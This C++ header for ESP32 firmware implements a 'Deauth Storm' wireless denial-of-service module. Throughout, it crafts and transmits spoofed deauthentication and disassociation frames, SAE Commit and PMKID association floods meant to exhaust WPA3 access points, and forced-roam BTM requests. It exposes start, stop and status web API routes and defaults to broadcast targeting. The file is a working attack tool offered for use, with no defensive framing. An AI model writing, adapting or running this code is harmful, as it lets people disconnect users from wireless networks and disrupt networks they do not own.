#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include "module.h"
#include "safety.h"
#include "frames.h"

// Deauth Storm — coordinated multi-vector deauth covering WPA2 AND WPA3.
//
// WPA2: bidirectional deauth + disassoc (4 frames)
// WPA3: SAE Commit flood (exhausts SAE state machine) +
//        PMKID assoc flood (exhausts AP CPU) +
//        BTM Request (forces roam)
//
// Cycling all vectors in one burst makes it effective regardless of
// PMF/WPA3 enforcement mode.

static uint8_t  ds_bssid[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
static uint8_t  ds_sta[6]   = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
static uint8_t  ds_chan      = 6;
static bool     ds_bcast     = true;
static bool     ds_running   = false;
static TaskHandle_t ds_task  = nullptr;
static volatile uint32_t ds_sent = 0;

// --- SAE Commit frame builder (minimal: group 19, random scalar+element) ---
static size_t ds_sae_commit(uint8_t* f, const uint8_t* bssid, const uint8_t* sta) {
  // Auth frame: type 0xB0, algorithm=3 (SAE), seq=1, status=0
  fhdr(f, 0xB0, 0x00, bssid, bssid, bssid);
  // Note: for SAE commit we set DA=BSSID so the AP processes it
  memcpy(f+4, bssid, 6); // DA
  for(int i=0;i<6;i++) f[10+i] = (esp_random()&0xFE)|0x02; // random LA SA
  memcpy(f+16, bssid, 6);
  f[22]=0x00; f[23]=0x00; // seq/frag
  f[24]=0x03; f[25]=0x00; // algorithm: SAE
  f[26]=0x01; f[27]=0x00; // seq 1
  f[28]=0x00; f[29]=0x00; // status 0
  f[30]=0x13; f[31]=0x00; // group 19 (P-256)
  // 32 bytes scalar + 64 bytes element (random)
  for(int i=32;i<128;i++) f[i]=esp_random()&0xFF;
  return 128;
}

// --- RSN PMKID assoc flood ---
static size_t ds_pmkid_assoc(uint8_t* f, const uint8_t* bssid) {
  // Assoc request frame
  uint8_t sta[6]; for(int i=0;i<6;i++) sta[i]=(esp_random()&0xFE)|0x02;
  fhdr(f, 0x00, 0x00, bssid, sta, bssid);
  f[24]=0x11; f[25]=0x00; // capabilities
  f[26]=0x01; f[27]=0x00; // listen interval
  uint8_t ssid[2]={0x00,0x00}; memcpy(f+28,ssid,2); // wildcard SSID IE
  static const uint8_t rates[]={0x01,0x08,0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
  memcpy(f+30,rates,10);
  // RSN IE with PMKID list (1 random PMKID = 16 bytes)
  f[40]=0x30; f[41]=0x1a; // RSN IE, len=26
  f[42]=0x01; f[43]=0x00; // version 1
  memset(f+44,0,4); // group cipher: none
  f[48]=0x00; f[49]=0x00; // pairwise count 0
  f[50]=0x00; f[51]=0x00; // akm count 0
  f[52]=0x00; f[53]=0x00; // capabilities 0
  f[54]=0x01; f[55]=0x00; // PMKID count = 1
  for(int i=56;i<72;i++) f[i]=esp_random()&0xFF; // random PMKID
  return 72;
}

static void ds_run(void*) {
  uint8_t f[256];
  static const uint8_t BC[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t phase = 0;
  while(ds_running) {
    if(!safety_rate_ok(1)){vTaskDelay(pdMS_TO_TICKS(50));continue;}
    const uint8_t* dst = ds_bcast ? BC : ds_sta;
    size_t n;
    switch(phase % 8) {
      case 0: // AP→STA deauth
        n = f_deauth(f, dst, ds_bssid, 7);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
        break;
      case 1: // AP→STA disassoc
        n = f_disassoc(f, dst, ds_bssid, 8);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
        break;
      case 2: // STA→AP deauth (reverse PMF bypass)
        if(!ds_bcast){
          n = f_deauth_r(f, ds_bssid, ds_sta, 7);
          esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
        }
        break;
      case 3: // STA→AP disassoc
        if(!ds_bcast){
          n = f_disassoc_r(f, ds_bssid, ds_sta, 8);
          esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
        }
        break;
      case 4: // SAE Commit flood (WPA3 state machine exhaustion)
        n = ds_sae_commit(f, ds_bssid, dst);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
        break;
      case 5: // SAE Commit flood second burst
        n = ds_sae_commit(f, ds_bssid, dst);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
        break;
      case 6: // PMKID assoc flood (WPA3 CPU drain)
        n = ds_pmkid_assoc(f, ds_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
        break;
      case 7: // BTM Request (force roam off-channel)
        {
          // Minimal action frame: category=10 (WNM), action=7 (BTM req)
          fhdr(f, 0xD0, 0x00, dst, ds_bssid, ds_bssid);
          f[24]=10; f[25]=7; f[26]=1; f[27]=0x03; // token, req mode
          f[28]=0; f[29]=0; // disassoc timer=0
          f[30]=255; // validity interval=255 TBTTs
          n = 31;
          esp_wifi_80211_tx(WIFI_IF_AP, f, n, false); ds_sent++;
        }
        break;
    }
    phase++;
    vTaskDelay(pdMS_TO_TICKS(5));
  }
  ds_task = nullptr; vTaskDelete(nullptr);
}

static String ds_qparam(const String& q, const char* key) {
  String k = String(key) + "=";
  int p = q.indexOf(k);
  if(p < 0) return "";
  p += k.length();
  int e = q.indexOf('&', p);
  return e < 0 ? q.substring(p) : q.substring(p, e);
}
static bool ds_start(const String& q) {
  if(ds_running) return false;
  String bssid_s = ds_qparam(q,"bssid");
  if(bssid_s.length()==0) bssid_s = "FF:FF:FF:FF:FF:FF";
  String ch_s    = ds_qparam(q,"ch");
  String sta_s   = ds_qparam(q,"sta");
  String bc_s    = ds_qparam(q,"broadcast");
  if(ch_s.length())  ds_chan = ch_s.toInt();
  if(bc_s.length())  ds_bcast = (bc_s != "0");
  if(sta_s.length()) {
    sscanf(sta_s.c_str(),"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
      &ds_sta[0],&ds_sta[1],&ds_sta[2],&ds_sta[3],&ds_sta[4],&ds_sta[5]);
  }
  sscanf(bssid_s.c_str(),"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
    &ds_bssid[0],&ds_bssid[1],&ds_bssid[2],&ds_bssid[3],&ds_bssid[4],&ds_bssid[5]);
  esp_wifi_set_channel(ds_chan, WIFI_SECOND_CHAN_NONE);
  ds_sent = 0; ds_running = true;
  xTaskCreate(ds_run,"ds",4096,nullptr,5,&ds_task);
  return true;
}
static void ds_stop() {
  ds_running = false;
  if(ds_task){ vTaskDelay(pdMS_TO_TICKS(50)); ds_task=nullptr; }
}
static void ds_routes() {
  extern WebServer server;
  server.on("/api/stormdeauth/start", HTTP_POST, [](){
    String q; for(int i=0;i<server.args();i++){if(i)q+='&';q+=server.argName(i)+'='+server.arg(i);}
    bool ok = tool_start("stormdeauth", q);
    server.send(200,"application/json",ok?"{\"ok\":1}":"{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/stormdeauth/stop", HTTP_POST, [](){
    tool_stop("stormdeauth"); server.send(200,"application/json","{\"ok\":1}");
  });
  server.on("/api/stormdeauth/status", HTTP_GET, [](){
    server.send(200,"application/json",
      "{\"running\":"+String(ds_running?1:0)+
      ",\"sent\":"+String(ds_sent)+
      ",\"msg\":\""+String(ds_sent)+" frames — WPA2+WPA3 vectors\"}");
  });
}
